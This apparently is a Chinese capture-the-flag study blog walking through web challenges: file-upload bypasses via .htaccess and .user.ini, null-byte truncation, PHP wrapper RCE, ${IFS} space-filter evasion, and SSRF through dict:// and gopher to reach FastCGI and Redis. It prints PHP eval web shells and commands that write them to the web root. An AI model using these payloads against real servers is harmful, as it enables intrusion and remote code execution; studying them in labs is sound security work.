src="https://img-blog.csdnimg.cn/20210218112901552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vim是一种开源编辑器，由于在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容：<br>第一次产生的交换文件名为 <code>. .swp</code><br>再次意外退出后，将会产生名为<code>. .swo</code>的交换文件<br>第三次产生的交换文件则为<code> . .swn</code><br>此题使用终端命令<code>vim -r index.php.swp</code>恢复原文件即可</p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br>利用工具dsstore:<code>python3 main.py .DS_Store</code>导出一个文本文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="https://www.secpulse.com/archives/95987.html">文件上传常见姿势</a></p><h4 id="js前端验证"><a href="#js前端验证" class="headerlink" title="js前端验证"></a>js前端验证</h4><p>写一个一句话木马 查看源码可知只允许上传图片格式<br>更改文件后缀名 抓包后改回后缀 上传后连接蚁剑<br>也可以直接禁用js直接上�</p><p>DVWA中级文件上传则是通过Content-Type在服务端MIME检测</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>修改Content-Type为image/jpeg、image/png、image/gif</p><h4 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h4><p>百度百科：<img src="https://img-blog.csdnimg.cn/20210223002229696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>利用条件</p><ul><li><p><input checked="" disabled="" type="checkbox">  apache服务器</p></li><li><p><input checked="" disabled="" type="checkbox">  能够上传.htaccess文件，一般为黑名单限制。</p></li><li><p><input checked="" disabled="" type="checkbox">  AllowOverride All，默认配置为关闭None。</p></li><li><p><input checked="" disabled="" type="checkbox">  上传目录具有可执行权限LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</p></li></ul><p>写一个<code>.htaccess</code>文件：</p><ul><li>正则匹配名为test的文件 当作php文件解析 ：</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span><br> <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>或：</p><ul><li>以php解析.htaccess文件所在目录及其子目录中的后缀为.xxx的文件文件</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php xxx<br><br>(AddHandler php5-<span class="hljs-keyword">script</span> php)<br></code></pre></td></tr></table></figure><p>然后直接一句话以php解析.htaccess文件所在目录及其子目录中的所有文件 上传一个test.jpg的一句话木马，然后连接蚁剑即可</p><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h4><p>上面的是对apache起作用的，而这个是对以fastcgi运行的php起作用的，不管他的服务器是nginx/apache/IIS，范围更广</p><p>php.ini是php的配置文件，通常下载下来的php都没有这个文件，有两个预置的ini模板，php.ini-development和php.ini-production,前者是开发环境推荐的，允许调试，少占资源；后者是上线产品时的环境推荐，禁止报错，提高性能</p><p>php.ini包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 ini 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 <code>.user.ini</code> 风格的 ini 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 ini 设置可被识别</p><p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png"></p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载，然后我们看到php.ini中的配置项，但是只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”，其中有两个可以利用的配置点</p><p>auto_append_file和auto_prepend_file</p><p>前者是文件包含在要执行的文件后，后者是自动包含在要执行的文件前</p><p>在.user.ini写入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auto_prepend_file=xxx.jpg<span class="hljs-regexp">/png/gi</span>f<br></code></pre></td></tr></table></figure><p>然后上传一个一句话图片马</p><p>buu一道题为例 buu suctf CheckIn</p><p>上传.user.ini后上传一个图片 抓包改包</p><p>此题检测<code>&lt;?</code>需要对一句话进行变形具体见一句话的变形</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210606161438091.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210606161521279.png"></p><p><strong>00截断</strong><br>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。%00和0x00,后台读取是遇到%00就会停止。举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。<br>00截断的限制条件：PHP&lt;5.3.29，且GPC关闭<br><strong>注意：00截断是在url的地方实现的</strong></p><p><img src="https://img-blog.csdnimg.cn/2021022323070732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>传图片马 burp抓包 改post后面的url<br><img src="https://img-blog.csdnimg.cn/20210223232427937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>蚁剑连接时注意修改url</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><strong>php://input</strong><br>利用php伪协议 <a href="https://segmentfault.com/a/1190000018991087">滚去看啦:PHP伪协议总结</a><br><img src="https://img-blog.csdnimg.cn/20210302113044978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>在hackbar内写<code>/?php://input</code>后POST传参<code>&lt;?php system(&#39;&#39;);?&gt;</code>得到flag<br><strong>远程包含</strong><br>此题也可以利用伪协议解开 但此题考查的是个人vps的利用 待补<br><strong>读取源代码</strong><br>利用伪协议中的<code>php://filter</code><br>构造url<code>/?php://filter/read=convert.base64-encode/resource=/flag</code></p><p>关于php一句话：<br>如果在浏览器传参，使用””包裹php一句话，并且echo &gt;*.php的方式写入时时，则需要注意对$的转义，避免此类情况的发生，建议使用’’”包裹一句话</p><p>在windows下利用cmd的echo &gt;*.php 需要对尖括号进行转义（不必加引号包裹），即：<br><code>^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt;</code></p><p>在linux下echo &gt;*.php：<br><code>&quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot;</code><br><code>&quot;&lt;?php @eval(\$_POST[\&quot;pass\&quot;]);?&gt;&quot;</code><br><code>&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;</code><br><code>&#39;&lt;?php @eval($_POST[\&#39;pass\&#39;]);?&gt;&#39;</code></p><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p><code>$&#123;IFS&#125;</code><br><code>$IFS$9</code><br><code>&lt;</code><br><code>&lt;&gt;</code><br><code>&#123;,&#125;</code><br>等可以代替空格<br>此题注释掉了答案而不回显 空格绕过后查看页面源码即可</p><h2 id="综合绕过"><a href="#综合绕过" class="headerlink" title="综合绕过"></a>综合绕过</h2><p>利用编码表打出组合拳<br><img src="https://img-blog.csdnimg.cn/20210313110431187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>读取Web目录下的flag.php 考了个常识，web目录在：<code>var/www/html</code><br>直接用读取文件的伪协议:<code>file:///var/www/html</code></p><h2 id="在线扫描端口"><a href="#在线扫描端口" class="headerlink" title="在线扫描端口"></a>在线扫描端口</h2><p>这里熟悉一个协议：<br>dict协议(2628)：<a href="http://www.dict.org是一个线上的字典查询网站(真就查单词的)/">www.dict.org是一个线上的字典查询网站(真就查单词的)</a> 能想到用这个协议来探测端口的也是人才<br>原理：（待补）<br>可以在命令行里连接玩一下 telnet ip 2628<br>help 查看帮助<br>define * (要查询的单词)<br><img src="https://img-blog.csdnimg.cn/20210313170807589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>好了 这是官方文档中dict://语法</p><p><img src="https://img-blog.csdnimg.cn/20210313170835224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>首先在地址栏构造<code>?url=dict://127.0.0.1:8000</code><br>由于dict://协议是一条一条执行的 需要让浏览器逐个访问8<del>9K的端口<br>从字典爆破的角度考虑，那么抓包，放到intruder，将端口标记，爆破模式选择number，设置8</del>9K的范围，爆破完毕，倒叙查看长度，payload为8057，回到浏览器访问该端口即可<br><img src="https://img-blog.csdnimg.cn/20210313171505715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171540971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171710798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">插一句，也可以直接访问127.0.0.1加端口再挂burp爆破</p><p><img src="https://img-blog.csdnimg.cn/20210314180743119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这里的题目开始难度跨越很厉害了 得去学习一些涉及到的协议了</p><p>首先，什么是<code>gopher协议</code><img src="https://img-blog.csdnimg.cn/20210320203305300.png"></p><blockquote><p>Gopher是Internet上一个非常有名的信息查找系统，由明尼苏达大学设计，并以该校的运动队“金色地鼠”（俚语：“去找”）来命名。在时间上，比Internet还要早几年。它只支持文本，不支持图像。该协议将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，Gopher客户程序和Gopher服务器相连接，并能使用菜单结构显示其它的菜单、文档或文件，并索引。同时可通过Telnet远程访问其它应用程序。Gopher协议使得Internet上的所有Gopher客户程序，能够与Internet上的所有已“注册”的Gopher服务器进行对话。<br>Gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求：gopher协议支持发出GET、POST请求，先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）<br>在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它</p></blockquote><p><strong><code>gopher协议没有默认端口，所以需要指定web端口，而且需要指定POST方法。回车换行使用%0D%0A替换%0A,POST参数之间的&amp;分隔符也要进行url编� �</code></strong></p><p>因此 为了使用gopher协议进行攻击 就必须将<code>&amp;</code>进行url编码（第一次） 而gopher协议将上面第一次的字符串传进服务器时 url解码（一次） 此时又会出现字符<code>&amp;</code> 而此时的url里gopher并不认可即将继续跳转的地址（含有未转码的&amp;） 因此我们要让第一次的<code>&amp;</code>转码<code>%26</code>再次转码为<code>%2526</code> 最后需要将上面的内容装进gopher协议里 所以进行最后一次转码 放进url里</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">ssrf对gopher协议的利用</a></p><ul><li>做题步骤</li></ul><p>dirsearch -&gt; 利用php伪协议file://访问一下 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br><br><span class="hljs-comment">//要求访问的远程地址必须为127.0.0.1(相当于实战中必须让远程目标主机本地访问)</span><br></code></pre></td></tr></table></figure><p>前端访问一下flag.php，查看源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span> /&gt;</span><br>  <span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=399be68d73e23ae8f326b4850128f33c--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用post的方式把key传进flag.php -&gt; 构造带key的POST包 抓包重放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /flag.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: curl<br>Accept: */*<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 36<br><br>key=---<br>#注意此处的Content-Length要与POST内容长度一致<br>#上面的整个POST包进行url编码<br>#将得到的编码中的所有%0A(数字0) 替换为%0D%0A (%0A为换行符——另起一新行，光标在新行的开头；%0D为回车——光标回到旧行(光标当前所在的行)的开头<br>#再将上面得到的编码再一次编码！<br></code></pre></td></tr></table></figure><p>将上面得到的拼接<strong>gopher协议</strong>重放即可 <img src="https://img-blog.csdnimg.cn/20210314175949642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><a href="https://blog.csdn.net/weixin_46203060/article/details/109548606?spm=1001.2014.3001.5501">wp参考博客</a></p><h2 id="文件上传-SSRF"><a href="#文件上传-SSRF" class="headerlink" title="文件上传(SSRF)"></a>文件上传(SSRF)</h2><p>同上一题查看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Upload Webshell：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-comment">&lt;!-- 这里在html表单里再加一行file换成submit 增加一个文件上传的按钮 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传一个文件 抓包改包和上一题差不多 但不需要构造post包</p><h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">typedef struct &#123;<br>  /* Header */<br>  unsigned char version; // 版本<br>  unsigned char type; // 本次record的类型<br>  unsigned char requestIdB1; // 本次record对应的请求id<br>  unsigned char requestIdB0;<br>  unsigned char contentLengthB1; // body体的大小<br>  unsigned char contentLengthB0;<br>  unsigned char paddingLength; // 额外块大小<br>  unsigned char reserved;<br><br>  /* Body */<br>  unsigned char contentData[contentLength];<br>  unsigned char paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p><ul><li>做题</li></ul><p>利用Gopherus生成payload</p><blockquote><p>已知存在的文件/var/www/html/index.php</p><p><strong>base64(<?php @eval($_POST['pass']);?>)=PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</strong></p><p>要执行的命令echo <code>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</code>|base64 -d &gt;/var/www/html/shell.php</p></blockquote><p>同上转码两次即可</p><h2 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h2><p>开放端口6379</p><p>Gopherus生成payload 进行两次转码 然后就在get传参cmd=ls…… 貌似要绕过空格</p><p><img src="https://img-blog.csdnimg.cn/20210423214036185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70#pic_center"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=ls<span class="hljs-variable">$&#123;IFS&#125;</span>/<br><span class="hljs-attr">cmd</span>=cat<span class="hljs-variable">$&#123;IFS&#125;</span>/flag<br></code></pre></td></tr></table></figure><p>不利用该脚本 自己写一个redis协议 写进一句话也可以 Gopherus生成的payload必须是cmd传参</p><h2 id="Training-Rebots"><a href="#Training-Rebots" class="headerlink" title="Training-Rebots"></a>Training-Rebots</h2><p>访问一下rebots.txt文件 根据允许和不允许抓包改包即可</p><h2 id="Can-you-anthenticate-to-this-website"><a href="#Can-you-anthenticate-to-this-website" class="headerlink" title="Can you anthenticate to this website?"></a>Can you anthenticate to this website?</h2><p>首先可以dirsearch扫一下要干什么<br><img src="https://img-blog.csdnimg.cn/20210317212908628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>很明显是登陆操作了<br>我们没办法盲目地登录 必须查看到登录源码才能进去，这里总结一下如何查看源码</p><p><strong>对网页源码的查看方法</strong></p><ol><li><p> 审查元素的方式 右击或者F12</p></li><li><p> 右击查看页面源代码或者url开头写<code>view-source:</code>也可以ctrl+u</p></li><li><p> phps文件类型主要由php组与php源关联。通常，php文件将由web服务器和php可执行文件解释(在服务器注册过的MIME类型的文件)，网站访问者看不到php文件代码。如果将文件扩展名设为.phps，服务器配置正确 将会输出源代码的彩色格式版本，而不是生成的HTML。</p></li><li><p>利用php伪协议<code>php://filter</code><br> 那么此题的就是用到<code>.phps</code>解开此题<br> 上面dirsearch并未发现这个文件 是脚本爆破的问题 可以向字典里面添加规则 